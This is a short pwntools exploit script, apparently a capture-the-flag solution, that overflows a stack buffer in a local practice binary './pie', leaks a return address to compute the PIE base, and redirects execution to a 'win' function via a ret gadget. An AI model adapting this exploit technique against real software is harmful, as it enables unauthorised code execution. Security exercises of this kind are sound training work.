from pwn import *

p = process("./pie")
e = ELF("./pie")
libc = e.libc

ret_gad = 0x55555555501a

# pie_base 구하기
payload = b'A'*0x10     #buf
payload += b'B'*0x8     #sfp
p.send(payload)

p.recvuntil(b"B")
vuln_ret = u64(p.recv(8).ljust(8, b'\x00')) 
log.info("vuln_ret: "+ hex(vuln_ret))

main = e.symbols['main']
pie_base = vuln_ret - (main+28)     # vuln_ret = main+28
win_addr = pie_base + 0x126f
ret_gad_addr = pie_base + 0x01a

# ret(win)
payload = b'A'*0x10     #buf
payload += b'B'*0x8     #sfp
payload += p64(ret_gad_addr)
payload += p64(win_addr)
p.send(payload)

p.interactive()